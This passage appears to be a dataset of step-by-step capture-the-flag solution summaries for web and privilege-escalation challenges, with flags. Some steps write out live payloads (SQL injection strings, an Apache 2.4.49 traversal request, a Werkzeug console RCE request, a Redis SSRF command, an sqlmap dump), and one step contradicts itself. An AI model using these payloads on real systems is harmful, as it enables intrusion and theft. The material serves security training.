    "Used `1'; USE information_schema; SHOW TABLES;`.",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings.",
    "Bypassed regex filters.",
    "Used `1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');` to retrieve data from the 'words' table.",
    "Used ``1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM `1919810931114514`');`` to retrieve data from the '1919810931114514' table.",
    "Used backticks around the numeric table name.",
    "Identified that the binary calls the 'id' command three times, with privileges",
    "Identified that the binary calls the 'id' command three times, without privileges",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called",
    "Recognized the need to manipulate the PATH variable due to the SUID flag being set",
    "Understood the goal to read the 'flag.txt' file that requires root access",
    "Understood that a shell needs to be spawned as root",
    "Created a bash script",
    "The bash script would only spawn the shell if the caller is root",
    "Translated the bash script into a one-liner",
    "The one-liner creates a malicious 'id' payload",
    "Went to the '/tmp' directory",
    "Created an 'id' file with the malicious payload",
    "Set permissions of the 'id' file to 777",
    "Exported '/tmp' to the PATH",
    "Ensured the shell would execute the malicious 'id'",
    "Ran 'insecure' to obtain a root shell",
    "Confirmed the malicious 'id' could be run as root",
    "Read the 'flag.txt' file using the root shell",
    "Successfully got the challenge flag",
    "Perform a directory scan.",
    "Identify available endpoints.",
    "Identify '/cmd.php' endpoint.",
    "Determine it potentially allows command injection.",
    "Attempt command injection.",
    "Observe the existence of a blacklist filter.",
    "Execute 'cat cmd.php' command.",
    "View the code of 'cmd.php'.",
    "Observe the presence of the blacklist filter in the code.",
    "Examine the blacklist filter code.",
    "Identify the replacement of blacklisted characters.",
    "Identify the replacement of blacklisted commands.",
    "Identify the use of base64-encoded payloads.",
    "Understand it as a potential workaround for the blacklist.",
    "Create a base64-encoded payload.",
    "Design the payload to read the desired file.",
    "Ensure the payload bypasses the blacklist.",
    "Construct a command.",
    "Include the base64-encoded payload in the command.",
    "Encode the payload using Python on the server.",
    "Output the constructed command.",
    "Verify the formatting of the command.",
    "Validate the content of the command.",
    "Identify a web application vulnerability, specifically XS Leaks.",
    "Observe the vulnerability in the incoming responses at the '/checkbalance' endpoint.",
    "Notice that users are redirected.",
    "Observe redirection when the queried amount exceeds the user's actual balance.",
    "Determine that window's history length can reveal whether a redirection occurred.",
    "Understand that the history length can be used to approximate the user's balance.",
    "Open a new window from the exploit server.",
    "Construct the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}' using the queried amount.",
    "Wait for the site to load.",
    "Observe the possibility of redirection to '/' depending on the user's balance.",
    "Change the window's location back to the exploit server.",
    "Check the window's 'history.length' attribute.",
    "Analyze the 'history.length' attribute to determine if a redirect occurred.",
    "Use trial and error to narrow down the appropriate number.",
    "Control the number of intervals in the aforementioned steps to aid in the narrowing down process.",
    "Build a HTML page to automate this process.",
    "Create a JavaScript script within the HTML page.",
    "Open a window.",
    "Check redirection in the window.",
    "Guess a number based on the window's history length.",
    "Use the 'tryNumber' function.",
    "Navigate to the '/checkbalance' endpoint with the queried amount.",
    "Register a delay for the page to load.",
    "Consider the possibility of redirection during the delay.",
    "Change the location of the pop-up back to the exploit server.",
    "Check the length of the window's history.",
    "Analyze the window's history length to determine if a redirection has occurred.",
    "Check if the history length is three.",
    "If the history length is three, the balance has been exceeded.",
    "Return false and the queried amount.",
    "If the history length is not three, the balance is exceeded.",
    "Return that the balance is exceeded and the queried amount.",
    "Start the checker.",
    "Specify the number range to be checked.",
    "Post each successful guess to the exploit server.",
    "Understood the presence of a blacklist filter for '#' symbol",
    "Understood the presence of a blacklist filter for '=' symbol",
    "Discovered that using 'test' or 1-- - can obtain possible account credentials",
    "Verified that the obtained credentials do not provide the flag",
    "Scheduled to perform a UNION based injection",
    "Objective is to dump the database and retrieve the flag",
    "Implemented the UNION based SQL Injection",
    "Used 'username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -' as the injection payload",
    "Received a collection of CSV files containing network traffic data",
    "Received a shapefile with information about cameras in Singapore",
    "Instructed to locate the origin point of most attacks",
    "Instructed to calculate the number of cameras within 1.3km radius of the origin point",
    "Wrote a Python script to extract the most commonly occurring source IP (src_ip) from the CSV files",
    "Discovered the latitude and longitude of the most frequently occurring src_ip",
    "Parsed the shapefile using geopandas",
    "Implemented haversine formula",
    "Used the formula to calculate the great-circle distance between locations",
    "Established the coordinates of the point of interest",
    "Looped through each camera location in the shapefile",
    "Checked if each camera location is within the specified distance from the point of interest",
    "Counted the number of cameras within the specified distance using the haversine formula",
    "Received a Markdown Editor web application to host notes for a challenge",
    "Admin bot visits URL submissions",
    "Started analysing how the web application processes Markdown",
    "Found that the preview feature is an iframe",
    "The iframe source is /demo",
    "Preview button posts a message to the iframe",
    "Message is only sent to the intended receiver",
    "Iframe's message is received and processed in /demo",
    "Data is POST-ed to the /api/filter endpoint",
    "Sanitized HTML is added to document.body.innerHTML",
    "Iframe posts the response from the /api/filter endpoint to window.parent",
    "Any site can create an iframe of the web application and receive the message",
    "User's cookies are sent along with the POST request",
    "Sensitive, user-specific data could be read if /api/filter endpoint returns based on these cookies",
    "Server code for /api/filter endpoint returns the hash of the user's token in the response",
    "Payload loads /demo in an iframe",
    "Payload posts a message to trigger the /api/filter POST request in the admin's context",
    "Payload catches and sends the response, containing the admin's hash, to an exploit server",
    "Received the admin's hash on the exploit server",
    "Admin's token access is required to access the flag",
    "CSRF to /api/flag is needed",
    "XSS on the challenge server is necessitated",
    "When the admin's hash is used, the /api/create handler does not sanitize data",
    "XSS payload is generated by sending a POST request to /api/create",
    "CSRF payload is created",
    "CSRF payload fetches /api/flag",
    "CSRF payload makes a callback to the exploit server with the page contents",
    "fromCharCode() is utilized to avoid escaping quotes",
    "Received the /api/flag contents",
    "URL-decoded the output",
    "Obtained the flag",
    "Identify the website's vulnerability to XSS.",
    "Examine the init() function of the website.",
    "Identify that the init() function changes the displayed note's innerHTML to the /get response on load.",
    "Discover that the user can add notes.",
    "Identify the POST request to /add for adding notes.",
    "Examine the /get endpoint.",
    "Examine the /add endpoint.",
    "Understand the relationship between the endpoints and the user's ID cookie in the Notes map.",
    "Recognize the XSS prevention methods implemented by the site.",
    "Identify that cookies are set to prevent XSS for all API endpoints.",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Examine the /find endpoint.",
    "Identify the request parameters of the /find endpoint: condition, startsWith, endsWith, and debug.",
    "Discover that the /find endpoint can be used for Response Header Injection.",
    "Use the /find endpoint to inject a Set-Cookie header.",
    "Inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Preserve the original admin's ID.",
    "Set the Path of the custom cookie to /get.",
    "Create a XSS payload.",
    "Ensure the XSS payload fits within the 75 character limit.",
    "Use JavaScript code using `document.cookie` to control variables in the payload.",
    "Use the /find endpoint.",
    "Encode the cookie-characters as response headers.",
    "Create a Python script.",
    "Generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Modify the output of the Python code.",
    "Format the output of the Python code to look like a JavaScript script.",
    "In the script, manipulate the multiple URL opens.",
    "Replace the multiple URL opens with actual browser window opens.",
    "Set malicious cookies.",
    "Have the user (admin) visit the URLs.",
    "Redirect the user to the main site.",
    "The malicious JavaScript code is executed on the client's side.",
    "The malicious code fetches an exploitative script.",
    "The exploitative script is run in the background.",
    "Perform a CSRF to the /find endpoint.",
    "Retrieve the flag.",
    "Make a callback to our server with the data.",
    "Extract the flag from the response received on the callback URL.",
    "Identify a URL for the server to request.",
    "Leverage a Local File Inclusion (LFI) vulnerability for Server Side Request Forgery (SSRF).",
    "View files using the 'file://' protocol.",
    "Verify the server code location from the provided Dockerfile as '/code/app.py'.",
    "Use a POST request to request 'file:///code/app.py'.",
    "Review the server code.",
    "Recognize that a Redis database was being utilized.",
    "Identify the hostname as 'redis' and port as 6379.",
    "Understand that a 'Requests_On_Steroids' function is used for POST request.",
    "Fetch the URL using the 'Requests_On_Steroids' function.",
    "Check if the value of <userID>_isAdmin key in Redis database is 'yes'.",
    "Show the flag in the response.",
    "Identify the need to overwrite the <userID>_isAdmin value.",
    "Leverage the SSRF vulnerability to communicate with the Redis instance.",
    "Observe that 'Requests_On_Steroids' function in 'main.py' supports Gopher protocol.",
    "Communicate with any TCP server using Gopher protocol.",
    "Discover that instead of 'gopher://' protocol, 'inctf://' should be used.",
    "Identify the 'GopherAdapter' code in 'modules/Gophers.py'.",
    "Find that the Gopher adapter used was modified from a GitHub gist.",
    "Remove '/_' in the URL's path.",
    "Realize the inability to send multi-line input using RESP protocol.",
    "Recognize that 'urllib.parse' was updated to strip newline characters.",
    "Use inline commands of Redis to send commands directly.",
    "Send the payload 'url=inctf://redis:6379/_SET <userID>_isAdmin \"yes\"'.",
    "Send the command 'SET <userID>_isAdmin \"yes\"'.",
    "Set the <userID>_isAdmin value to 'yes'.",
    "Receive the flag 'inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}'.",
    "Identify the target page '/post.php'.",
    "Recognize the presence of a Local File Inclusion vulnerability on '/post.php'.",
    "Craft a request to '/post.php?post=../../../../../../etc/passwd'.",
    "Send the crafted request to confirm the presence of the vulnerability.",
    "Make a decision to achieve remote code execution.",
    "Recognize the requirement of having write access to a file on the server.",
    "Discover the PHP sessions are file-based.",
    "Identify the predictable storage location of PHP sessions as '/tmp/sess_<PHPSESSID>'.",
    "Recognize the existence of '/set.php' page.",
    "Identify the capability of setting the 'theme' value in the session using the 'theme' GET query parameter.",
    "Understand the possibility of accessing the session file through the LFI vulnerability.",
    "Recognize that the set input reflects in the included PHP code.",
    "Craft a request to set the theme to '<?php phpinfo() ?>'.",
    "Send the crafted request to confirm the vulnerability and the input reflection.",
    "Search for a PHP payload that creates a web shell.",
    "Craft a request to set the theme to the PHP payload.",
    "Utilize the web shell to gain access to the file system.",
    "Explore the file system to find the flag 'MetaCTF{wh4t??lfi_1s_ev0lv1ng??}'.",
    "Given login credentials for an online portal with MFA and Captcha code protection.",
    "Notice a 'login_session_token' is received upon login attempt.",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Discover that there is no limit to the number of attempts made with the same token, as long as correct CAPTCHA code is provided.",
    "Perform batching in GraphQL to send multiple queries at once, with the anticipation that the server will process all queries together using the same CAPTCHA code.",
    "Successfully use the same CAPTCHA code to test two different MFA tokens by sending them both in the same HTTP request.",
    "Understand that MFA token is only 4 digits and take advantage of this limited search space by sending batches of thousands of queries together, thereby reducing the number of required CAPTCHA responses.",
    "Observe that due to request length limits around 3000 queries are batched at a time.",
    "Write script to automate this process of generating payloads and making POST requests.",
    "Note that every 3000 attempts, the CAPTCHA code needs to be updated manually in the script.",
    "Found a successful login attempt among the batched requests.",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "Analyzed the initial JavaScript code.",
    "Identified potential vulnerabilities.",
    "Identified a line of code where user input is passed unfiltered.",
    "Recognized that the user input is directly used in an SQL query.",
    "Recognized the platform as SQLite database.",
    "Injected a UNION query.",
    "Retrieved table names.",
    "Confirmed the existence of an additional table.",
    "Identified the additional table holding the flag.",
    "Ran a final UNION query.",
    "Extracted the flag from the identified table.",
    "Retrieved the flag.",
    "Initiated a network scan using Nmap",
    "Performed a port scan and identified Apache server version 2.4.49 operating on port 12380",
    "Conducted research and determined that Apache server version 2.4.49 has a known vulnerability",
    "Visited the vulnerability database at https://www.exploit-db.com/exploits/50383",
    "Exploited the Remote Code Execution (RCE) vulnerability to gain unauthorized access to the system",
    "Crafted a malicious HTTP GET request to exploit the identified vulnerability",
    "Inserted a series of directory traversal characters (/%2e%2e/%2e%2e) in the request to access server root directories",
    "Exploited the directory traversal vulnerability to execute commands and retrieve the contents of the flagged file located at /secret/safe/flag.png",
    "Encoded the contents of the retrieved file in base64 format for smooth transfer without encoding issues",
    "Identified 'Server' response header.",
    "Observed Apache Traffic Server (ATS) 7.1.1 in 'Server' response header.",
    "Identified vulnerability CVE-2018-8004.",
    "Recognized vulnerability as a request smuggling vulnerability.",
    "Identified lack of validation for 'Content-Length' headers as the cause of the vulnerability.",
    "Observed the server using 'Content-Length' header.",
    "Noticed that the server uses 'Content-Length' header even if 'Transfer-Encoding' header exists.",
    "Identified the usage of 'Content-Length' header with 'Transfer-Encoding' header as a request smuggling vulnerability.",
    "Observed a request to '/save.php'.",
    "Noted the appending of an entry to a log file.",
    "Observed the entry in the log file containing the cookies and value of 'X-Access' header.",
    "Assumed an admin visit to the site.",
    "Constructed a CL-TE request smuggling attack.",
    "Directed the admin to '/save.php'.",
    "Crafted a payload using 'GET / HTTP/1.1'.",
    "Included the 'Content-Length' header in the payload.",
    "Included the 'Transfer-Encoding' header in the payload.",
    "Realized the ATS server forwards the payload as a single request to the Nginx backend.",
    "Observed that Nginx sees the 'Transfer-Encoding' header.",
    "Noticed that Nginx considers the first request ended with the 'Transfer-Encoding' header.",
    "Noted the existence of the second request 'GET /save.php HTTP/1.1'.",
    "Recognized that the second request is not yet completed after the end of the first request.",
    "Identified the admin's visit as a third request.",
    "Recognized that the admin's request is appended to the incomplete second request.",
    "Noted that the appended requests are processed as one single request.",
    "Recognized the presence of admin's 'Cookie' and 'X-Access' headers.",
    "Noted that the single request contains the admin's headers.",
    "Viewed the admin's cookie and 'X-Access' headers.",
    "Obtained the headers from the log file.",
    "Used the admin's cookies to visit 'private.php'.",
    "Obtained the flag from 'private.php'.",
    "Registration process was completed in the system.",
    "Observed redirection to `/users/<username>/files` after registration.",
    "Noticed the presence of file upload capability.",
    "Utilized two accounts for user enumeration.",
    "Successfully established the ability to enumerate usernames at `/users/<username>`.",
    "Redirected to own account upon a successful enumeration (403 redirect).",
    "Received 404 Not Found error upon a failed enumeration.",
    "Utilized the `dirb` wordlist for username enumeration.",
    "Discovered valid usernames including `admin`, `root`, `builder`, `employee`, and `staff`.",
    "Observed server side validation for valid user during file retrieval at `/users/<username>/files/<filename>`.",
    "Noticed the absence of legitimate ownership verification during file retrieval.",
    "Identified an Insecure Direct Object Reference (IDOR) vulnerability due to the absence of ownership verification during file requests.",
    "Scanned each discovered username for potential files associated with them.",
    "Located the flag at `/users/employee/files/fileadmin`.",
    "Log into the application",
    "View the page source",
    "Analyze the data being displayed",
    "Identify the 'role' attribute",
    "Determine the potential for privilege escalation",
    "Examine the registration fields",
    "Understand the submitted data during registration",
    "Identify the 'account' object",
    "Identify the 'username' and 'password' attributes",
    "Submit the registration form",
    "Change the 'account[role]' attribute to 'admin'",
    "Escalate privileges",
    "Access the '/admin' page",
    "Verify that the role was changed to 'admin'",
    "Identify the application listening on port 11111.",
    "Determine that the identified application is a web application.",
    "Assess the web application.",
    "Locate the login function in the web application.",
    "Identify the input fields for the login function.",
    "Determine that the input fields for the login function are 'username' and 'password'.",
    "Assume that the input fields are not properly sanitizing special characters.",
    "Decide to attempt SQL injection on the input fields.",
    "Input the SQL injection payload in the 'username' field as `username=admin&password=' or '1`.",
    "Input the SQL injection payload in the 'password' field as `username=admin&password=' or '1`.",
    "Execute the SQL injection payload.",
    "Bypass the login function successfully due to successful SQL injection.",
    "Identify the challenge.",
    "Locate the challenge at port 8080.",
    "Note the challenge has a web interface.",
    "Recognize the challenge.",
    "Note the challenge is related to cookie manipulation.",
    "Notice the cookies.",
    "Observe cookies being set at every stage of authentication.",
    "Recognize the necessity.",
    "Note certain cookies are required.",
    "Understand the goal is to gain access to '/admin'.",
    "Inject a cookie.",
    "Name the cookie 'username'.",
    "Assign the value 'admin' to the cookie.",
    "Inject another cookie.",
    "Name the cookie 'visited-main-page'.",
    "Assign the value 'true' to the cookie.",
    "Inject a further cookie.",
    "Name the cookie 'made-an-account'.",
    "Assign the value 'true' to the cookie.",
    "Inject another cookie.",
    "Name the cookie 'authenticated-user'.",
    "Assign the value 'true' to the cookie.",
    "Inject a final cookie.",
    "Name the cookie 'admin'.",
    "Assign the value 'true' to the cookie.",
    "Access '/admin'.",
    "Use the manipulated cookies to gain access.",
    "Analyzed the provided PHP source code.",
    "Identified vulnerabilities in the PHP source code.",
    "Noted that most common PHP file extensions are blocked.",
    "Observed that .htaccess extension is allowed.",
    "Created a .htaccess file.",
    "Modified .htaccess to interpret .php16 as PHP.",
    "Uploaded the .htaccess file.",
    "Created a .php16 file.",
    "Uploaded the .php16 file.",
    "Used the remote code execution.",
    "Downloaded the flag.",
    "Identify the challenge as a Server Side Request Forgery (SSRF) issue.",
    "Determine the vulnerable parameter as 'galleryUrl'.",
    "Decide to exploit the SSRF vulnerability.",
    "Choose to make an internal request.",
    "Specify the '/admin' path as the target.",
    "Craft the malicious query.",
    "Include the '/gallery?galleryUrl=' query parameter.",
    "Specify 'http://localhost:20011/admin' as the value for the 'galleryUrl' parameter.",
    "Use the crafted query to access the admin console via internal request.",
    "Analyze the source codes provided.",
    "Understand the requirements to pass the login authentication that includes correct username, password, and a Multi-factor Authentication (MFA) token.",
    "Identify the hardcoded username.",
    "Confirm the password from a known resource.",
    "Identify PHP object injection vulnerability through unserialize() function.",
    "Realize that initialization of the 'mfa' attribute as a reference to the '_correctValue' attribute allows to bypass the MFA check.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Serialize the created object and encode it in base64 format.",
    "Reconstruct the user data from the encoded string.",
    "Verify the user data.",
    "Pivot from the previously found IP address.",
    "Scan the pivoted IP address.",
    "Find a HTTP service.",
    "Identify the service.",
    "Verify that the service is the app mentioned in the challenge.",
    "Test the app.",
    "Discover that the app uses curl for certain inputs.",
    "Determine the IP address in the URL.",
    "Check the IP address against the whitelist.",
    "Identify the whitelist of allowed IP ranges: 10.0.0.0/24, 10.0.42.0/24, and 10.0.43/24.",
    "Conduct a Burp intruder scan.",
    "Scan 10.35.2.134/call_api.php.",
    "Identify potentially connectable hosts.",
    "Scan the 10.0.42.0/24 network.",
    "Discover valid endpoints at 10.0.42.2 and 10.0.42.200.",
    "Identify the GET form with 'search' parameter in 10.0.42.200.",
    "Test basic payloads.",
    "Identify SQL injection is possible.",
    "Spaces aren't allowed.",
    "Attempt SQL injection using MySQL comments in place of spaces.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='1'.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
    "Set up a local HTTP proxy using cURL to accommodate the complex GET request.",
    "Run SQLMap command 'sqlmap http://127.0.0.1/test.php?search=abc -p search --tamper=space2comment --technique=B --risk 3 --dump --threads 10 -D db -T internal_api_infos' to inject and dump database data.",
    "Use the dumped admin credentials to login to the first webpage.",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Check the cookies.",
    "Look for a value for 'confidential_documents'.",
    "Understand that the API is powered by Werkzeug.",
    "Recognize that Werkzeug includes a debugging console at '/console' when debugging is enabled.",
    "Make the inference that if debugging is enabled, it would likely be on the development server.",
    "Infer that debugging on the production server is unlikely.",
    "Visit the URL `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole`.",
    "Search for a Werkzeug console.",
    "Find the secret key for the debugger.",
    "Identify that the secret key is hardcoded in the JavaScript.",
    "Craft a request with the following parameters: `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole?__debugger__=yes&cmd=__import__('os').listdir('/')%3b&frm=0&s=IUrsy36AKlZ2zvT1vaPc`.",
    "Initiate Remote Code Execution (RCE) through the crafted request.",
    "Search for `flag.txt` in the root directory.",
    "Send a request to read the content of the `flag.txt` file.",
    "Identify the problem that requires generating two PDFs.",
    "Identify the requirement of same MD5 hash for the two PDFs.",
    "Identify the requirement of different content for the two PDFs.",
    "Consider size restrictions for choosing two small-sized PDFs.",
    "Use Python scripting to manipulate the PDF files.",
    "Use the 'mutool' command to manipulate the PDF files.",
    "Create 'first.pdf' using the chosen input PDF.",
    "Create 'second.pdf' using the chosen input PDF.",
    "Create 'merged.pdf' containing a dummy PDF.",
    "Include the chosen input PDFs in the 'merged.pdf'.",
    "Read and store the content of the merged PDF file.",
    "Read and store the content of the initial PDF files.",
    "Extract the count of PDF pages from the merged PDF file.",
    "Extract the count of PDF pages from the initial PDF files.",
    "Identify the list of references to the PDF pages in the merged PDF file.",
    "Exclude the reference to the dummy page from the list of PDF pages.",
    "Create a separate PDF page list for the first input PDF.",
    "Create a separate PDF page list for the second input PDF.",
    "Define a template for the final PDF files.",
    "Ensure the template holds identical initial content and MD5 hashes.",
    "Diverge the template at a certain point to create two different PDFs.",
    "Use the page count and PDFs list to write a manipulated 'hacked.pdf' file.",
    "Use the 'mutool clean' command to adjust the offsets in the PDF.",
    "Replace a specific string in the cleaned PDF data.",
    "Read the 'pdf1.bin' file.",
    "Read the 'pdf2.bin' file.",
    "Create 'collision1.pdf' with the predetermined prefix.",
    "Create 'collision2.pdf' with the predetermined prefix.",
    "Include the cleaned, manipulated PDF data in 'collision1.pdf'.",
    "Include the cleaned, manipulated PDF data in 'collision2.pdf'.",
    "Check the MD5 hash of 'collision1.pdf' using the hashlib library.",
    "Check the MD5 hash of 'collision2.pdf' using the hashlib library.",
    "Remove the intermediate 'merged.pdf' file.",
    "Remove the intermediate 'hacked.pdf' file.",
    "Use the 'mutool info -X' command to verify 'collision1.pdf'.",
    "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
    "Upload 'collision1.pdf' to the challenge page.",
    "Upload 'collision2.pdf' to the challenge page.",
    "Unlock the flag and source code using the uploaded PDFs.",
    "Investigate the source code provided.",
    "Understand how the application works and what needs to be exploited.",
    "Find that the '/display' page checks the session cookie.",
    "Identify the `very_auth` session variable that needs to be set to `admin`.",
    "Discover that the Flask session secret key is hardcoded into the source code.",
    "Realize that the secret key is selected randomly from an array of cookie names.",
    "Extract the text before the period (.) from the Flask session cookie.",
    "Add padding to the extracted text.",
    "Apply Base64 decoding to the padded text.",
    "Notice that the remainder of the session cookie is a signature.",
    "Understand that the signature is checked server-side to prevent tampering.",
    "Realize that the secret key needs to be cracked.",
    "Write a script to bruteforce each of the hardcoded cookie names.",
    "Find the cookie name that matches the signature.",
    "Run the script.",
    "Discover that the secret key is 'butter'.",
    "Craft a new session cookie with the `very_auth` variable set to 'admin'.",
    "Use hashlib, URLSafeTimedSerializer and TimestampSigner in Python.",
    "Utilize the secret key for crafting the new session cookie.",
    "Encode the session.",
    "Obtain a new session cookie as output.",
    "Place the newly crafted cookie back into the application using Burpsuite.",
    "Observe the flag in the response after placing the cookie.",
    "Accessed the Startup Company web page.",
    "Identified a potential SQL injection point in the 'moneys=' parameter.",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter.",
    "Confirmed SQLite injection was possible by manipulating the 'moneys=' parameter and seeing the results in the green text.",
    "Confirmed the use of SQLite version 3.22.0.",
    "Retrieved table names from the database by manipulating the SQL query using 'moneys=' parameter.",
    "Used GROUP_CONCAT function to concatenate all retrieved table names into a single string.",
    "Retrieved column names of 'startup_users' table from the database using the SQL query.",
    "Used GROUP_CONCAT function to concatenate all retrieved column names into a single string.",
    "Dumped data from 'startup_users' table by using the SQL query and concatenating usernames using the GROUP_CONCAT function.",
    "Identified 'the_real_flag' user and suspected the flag to be in the 'wordpass' value.",
    "Retrieved the flag by dumping data from 'startup_users' table again, this time concatenating 'wordpass' values using the GROUP_CONCAT function.",
    "Access the provided URL",
    "Download the robots.txt file",
    "Review the robots.txt file",
    "Attempt to navigate to /admin.phps",
    "Receive a 'Not Found' error",
    "Navigate to /index.phps",
    "Reveal source code for index.php",
    "Find a reference to authentication.php in the index.php code",
    "Navigate to /authentication.phps",
    "View the source code of authentication.php",
    "Reveal a 'require_once()' function call",
    "Include the cookie.php file",
    "View the source code of cookie.php",
    "Identify a potential PHP deserialization vulnerability in cookie.php",
    "$_COOKIE['login'] is deserialized",
    "Find the 'access_log' class in authentication.php",
    "The 'access_log' class has a '__toString()' function",
    "The '__toString()' function can return the contents of a file",
    "Understand the possibility of retrieving the flag by crafting and serializing a custom 'access_log' object",
    "The log_file of the 'access_log' object is set to '../flag'",
    "The flag retrieval is possible due to the deserialization of the 'login' cookie",
    "Construct a custom PHP script",
    "Create and serialize an 'access_log' object",
    "Set the log_file of the 'access_log' object to '../flag'",
    "Encode the serialized object with base64",
    "Decide to add the base64-encoded serialized object as a 'login' cookie in the browser",
    "Navigate to /authentication.php",
    "The 'access_log' class is defined in /authentication.php",
    "Understand the deserialization of the added cookie into an 'access_log' object",
    "The deserialized object is assigned to the $perm variable in 'authentication.php'",
    "The assignment to $perm triggers the catch block",
    "The flag is inadvertently printed in the catch block due to the '__toString()' method of the 'access_log' class",
    "Observe that the flag is revealed on the browser",
    "Accessed the website provided in the challenge",
    "Checked the filter page for clues or information",
    "Noticed the feature using SQLite through filters and SQL statements",
    "Created exploit using SQL injection: 'adm' || trim('in', ` Password: `) || ''",
    "Discovered that `||` is the SQLite concatenation operator and is used to join strings together",
    "Understood that trim(string, character) will remove `character` from `string`.",
    "' AND password=' is treated as a string and hence, ignored",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "Recognized that this SQL statement is equivalent to SELECT username, password FROM users WHERE username='adm' || 'in' || ''",
    "Realized finally that both SQL statements are identical to 'SELECT username, password FROM users WHERE username='admin''",
    "Logged in as admin using the discovered SQL injection",
    "Checked the filter page again to see any changes",
    "Attempted the third web Gauntlet where the length requirement is reduced",
    "Tried the previously discovered SQL injection, found that it still works",
    "Visited the URL provided in the problem statement.",
    "Identified that the web application might have an XPath injection vulnerability.",
    "Started testing for potential XPath injection points in the application.",
    "Used automated tools or manual testing to check for error messages indicative of XPath Injection.",
    "If identified, manipulated the XPath query to bypass authentication mechanisms of the application.",
    "Once successful, noted the steps taken to reproduce the attack.",
    "Reported the findings on the platform provided for the CTF Challenge.",
    "Analyze the source code.",
    "Identify the basic authentication credentials as `admin:admin` for testing locally.",
    "Identify interesting functionality of the app.",
    "Modify the `services` object by POST-ing JSON to the `/change_status` endpoint.",
    "Use the `fast-json-patch` library for the modification.",
    "Conduct research on prototype pollution vulnerability.",
    "Identify the existence of prototype pollution vulnerability in the `applyPatch()` function.",
    "Realize the effect of POST-ing certain data.",
    "Include `constructor/prototype/offline` in the POST data.",
    "Observe that every object now has the `offline` attribute.",
    "Identify the potential for serious exploits.",
    "Link the potential exploits to the presence of prototype injection vulnerability in the server-side code.",
    "Explore the potential of achieving RCE.",
    "Exploit the `ejs` module.",
    "Leverage the `constructor/prototype/outputFunctionName` to achieve RCE.",
    "Identify the usage of `ejs`.",
    "Recognize `ejs` as a library used for templating in web applications.",
    "Conduct local testing for potential RCE.",
    "POST data that includes `constructor/prototype/outputFunctionName`.",
    "Check the output after executing the command.",
    "Execute the command `whoami >> src/static/style.css`.",
    "Verify the output reflected in the `style.css` file.",
    "Deploy the provided Docker image.",
    "Examine the `readflag` binary.",
    "Attempt to open a bind shell on port 4444.",
    "Enable running the `readflag` binary using the bind shell.",
    "Attempt to connect to the real server.",
    "Set up a `ngrok` TCP forwarder.",
    "Modify the RCE to trigger a reverse shell.",
    "Use the public endpoint given by `ngrok`.",
    "Catch the reverse shell using the public endpoint.",
    "Retrieve the flag.",
    "Parsed the challenge PHP source code.",
    "Noted potential XXE vulnerability because of 'LIBXML_NOENT' flag in 'loadXML()' function.",
    "Created an LFI payload with a form.",
    "The form contains an XML part.",
    "The XML part substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation.",
    "Sent the payload to the server.",
    "Received a list of users as a response.",
    "Confirmed the XXE vulnerability.",
    "Unable to find flag files.",
    "Confirmed that remote code execution (RCE) was necessary.",
    "Uploaded a PHP file to the server.",
    "Made a request to the file.",
    "Ran PHP code while XML parsing is performed.",
    "Used 'php://filter/'",
    "Base64 encoded the output of the PHP 'phpinfo()' function.",
    "Reflected the result into the 'user' tag of the HTML response.",
    "Analyzed 'phpinfo()' output.",
    "Identified 'disable_functions' configuration.",
    "Identified that functions for shell command execution were disabled.",
    "Used a recent exploit.",
    "Bypassed 'disable_functions' on PHP 7.0-8.0 versions.",
    "Gained shell remote code execution.",
    "Wrote the final payload.",
    "Uploaded the final payload to the server.",
    "Used the same request to read the flag from the '/readflag' binary.",
    "Modified the payload script.",
    "Incorporated the PHP 'disable_functions' bypass exploit.",
    "Ran '/readflag' by passing it as an argument to the defined 'pwn' function.",
    "Executed HTTP POST request to the target server.",
    "Included the final payload as part of form data.",
    "Received the flag as part of HTML response.",
    "Confirmed successful RCE exploited to get the flag.",
    "Started examining the Dockerfile provided.",
    "Identified a misconfiguration in the `apache.conf` file.",
    "Noticed that `<Directory />` is incorrectly set to refer to the filesystem directory and not the web root.",
    "Recognized this configuration grants access to any file on the filesystem.",
    "Checked server responses to identify Apache server version (2.4.49).",
    "Acknowledged this version is vulnerable to a recent path traversal zero-day.",
    "Executed a GET request `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt HTTP/1.1` to exploit this vulnerability.",
    "Retrieved the flag at `/flag.txt`.",
    "Visit the provided site",
    "Encounter the text 'Hello Mars!'",
    "Perform a directory busting scan using gobuster",
    "Discover potential directories or files",
    "Discover several directories including /app and /flag.txt",
    "Note that /flag.txt is inaccessible",
    "Visit /app",
    "Find a web proxy application",
    "Observe that the web proxy application is 'Powered by PHP-Proxy'",
    "Follow the provided link to the PHP-Proxy GitHub repository",
    "Search for 'vulnerability' in the GitHub repository's Issues",
